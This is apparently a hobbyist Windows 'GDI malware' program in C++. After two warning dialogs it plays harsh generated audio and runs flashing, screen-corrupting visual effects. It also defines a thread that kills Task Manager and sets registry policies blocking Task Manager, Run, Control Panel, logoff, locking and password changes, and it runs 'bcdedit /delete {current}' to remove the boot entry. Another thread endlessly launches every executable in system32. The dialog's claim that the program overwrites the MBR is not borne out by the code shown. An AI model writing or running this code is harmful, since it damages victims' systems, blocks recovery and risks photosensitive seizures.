typedef struct IUnknown IUnknown;
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <cstdint>
#include <ctime>
#include <cstdlib>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")
#define pi   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 1 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(1000);
        }
    }
}

DWORD WINAPI shaking(LPVOID lpParam) {
    int r = 10;
    while (true) {
        RECT rect;
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rect);
        int po = rand() % 4 + 1;
        if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, SWP_NOSIZE);
        if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, SWP_NOSIZE);
        Sleep(10);
    }
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((t ^ t >> 8) * (t | t >> 5) + (t | t << 4) + (t | t >> 7)) / 674) & 128
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            tan(t / 44 | t / 107 & t / 84 & t / 49)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t + t >> 8) & (t | t >> 5) & (t | t << 4) + (t | t >> 7)) * t
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t >> 6 ^ t & 37 | t + (t ^ t >> 11) - t * ((t % 24 ? 2 : 6) & t >> 11) ^ t << 1 & (t & 598 ? t >> 4 : t >> 10)) * 101
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t / 16) & 1) * (t >> 5 & t >> 6) - t
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound6(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t * (t + (t >> 9 & 10 | t >> 11 & 23 ^ t >> 10 & 15 & t >> 15))) | t >> 2) * 5
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

DWORD WINAPI wave(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);
    HDC screenDC = GetDC(0);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP memBmp = CreateCompatibleBitmap(screenDC, width, height);
    SelectObject(memDC, memBmp);
    float angle = 0.0f;
    while (true) {
        screenDC = GetDC(0);
        BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
        for (int y = 0; y < width; y++) {
            int offset = (20 * sin(angle + y * 0.01f));
            BitBlt(screenDC, y, 0, 1, height, memDC, y, offset, SRCCOPY);
        }
        BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
        for (int x = 0; x < height; x++) {
            int offset = (20 * sin(angle + x * 0.01f));
            BitBlt(screenDC, 0, x, width, 1, memDC, offset, x, SRCCOPY);
        }
        PatBlt(screenDC, 0, 0, width, height, PATINVERT);
        angle += 1.f;
        ReleaseDC(0, screenDC);
        DeleteDC(screenDC);
    }
    return 0;
}

DWORD WINAPI payload1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int v = 0;;
    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCERASE);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h, t = y ^ y | x;
            data[i].rgb += (x ^ y) * v;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCERASE);
        PatBlt(desk, 0, 0, w, h, PATINVERT);
        v++;
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        DeleteObject(brush);
    }
    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);
    HDC screenDC = GetDC(0);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP memBmp = CreateCompatibleBitmap(screenDC, width, height);
    SelectObject(memDC, memBmp);
    float angle = 0.0f;
    while (true) {
        screenDC = GetDC(0);
        BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCINVERT);
        for (int y = 0; y < width; y++) {
            int offset = (20 * sin(angle + y * 0.01f));
            BitBlt(screenDC, y, 0, 1, height, memDC, y, offset, SRCPAINT);
        }
        for (int x = 0; x < height; x++) {
            int offset = (20 * sin(angle + x * 0.01f));
            BitBlt(screenDC, 0, x, width, 1, memDC, offset, x, SRCPAINT);
        }
        BitBlt(screenDC, 0, 0, width, height, memDC, 0, 0, SRCERASE);
        angle += 0.3f;
        ReleaseDC(0, screenDC);
        DeleteDC(screenDC);
    }
    return 0;
}

DWORD WINAPI moricons(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HINSTANCE lib = LoadLibraryA("moricons.dll");
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 113)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}

DWORD WINAPI payload3(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            INT x = i % w, y = i / w;
            if (i % h == 0 && rand() % 255 == 0)
                v = rand() % 5;
            ((BYTE*)(data + i))[v % 3] += (sin(x / 100.f) + sin(y / 100.f)) * 100;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCPAINT);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w / 2));
                int cy = (y - (h / 2));

                int zx = cos(angle) * cx - tan(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                int fx = (cbrt(zx * zx) + cbrt(zy * zy)) + (i * 10);

                rgbquad[index].rgbRed ^= (fx + 16);
                rgbquad[index].rgbGreen ^= (fx + 32);
                rgbquad[index].rgbBlue ^= (fx + 64);
            }
        }

        i++; angle += 0.1f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI payload5(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    HDC hdc = GetDC(NULL);
    INT q = 1;
    INT x = 0; INT y = 0;

    while (true)
    {
        DWORD rop = SRCAND;
        INT size = w / (w / q);

        int dx0 = sin(q / 25.f) * 2;
        int dy0 = x;

        if (rand() % 2 == 0) BitBlt(hdc, -dx0, dy0, w, size, hdc, dx0, dy0, rop);
        if (rand() % 2 == 0) BitBlt(hdc, dx0, dy0, w, size, hdc, -dx0, dy0, rop);

        x += size;
        y += size;
        q++;
        if (q > w / 16) q = 1;

        if (x > w)
        {
            x = 0;
        }
        if (y > h)
        {
            y = 0;
        }
    }

    return 0x00;
}

int inc = 0;

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(NULL);

    POINT hex[8];

    double cx = x + w / 2.0;
    double cy = y + h / 2.0;
    double r = min(w, h) / 2.0;

    for (int i = 0; i < 4; i++)
    {
        double a = (90.0f * i - inc) * pi / 180.0;

        hex[i].x = (cx + r * cos(a));
        hex[i].y = (cy + r * sin(a));
    }
    inc++;

    HRGN hrgn = CreatePolygonRgn(hex, 4, WINDING);

    SelectClipRgn(hdc, hrgn);

    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);

    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left, h = rect.bottom - rect.top;

    for (int t = 0;; t++)
    {
        const int size = GetSystemMetrics(0) - rand() % GetSystemMetrics(1);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(1);
        }
    }
}

DWORD WINAPI payload6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.37f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = (x - (w / 1.4));
                int cy = (y - (h / 1.5));

                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;

                INT fx = (zx + i) ^ (zy + i * 3);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);

                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx | x ^ y) / 10000.0 + 0.09, 1.0);
                hslcolor.s = 1.f;
                if (hslcolor.l < 0.4f) {
                    hslcolor.l += 0.2f;
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        angle += 0.1f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

INT WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
    if (MessageBoxW(NULL, L"This is a malware, Run?", L"uswx1mjkfsav08x.exe by UltraDasher965", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are you sure? It contains flashing lights and overwrites the MBR - NOT for epilepsy", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - uswx1mjkfsav08x.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            Sleep(500);
            MessageBoxW(0, L"", L"", MB_ICONERROR | MB_OK);
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            HANDLE thread1dot1 = CreateThread(0, 0, wave, 0, 0, 0);
            sound1(11025, 30);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            TerminateThread(thread1dot1, 0);
            CloseHandle(thread1dot1);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            CreateThread(0, 0, moricons, 0, 0, 0);
            sound2(48000, 30);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3(11025, 30);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4(44100, 30);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            sound5(22050, 30);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            CreateThread(0, 0, wef, 0, 0, 0);
            sound6(11025, 30);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
        }
    }
}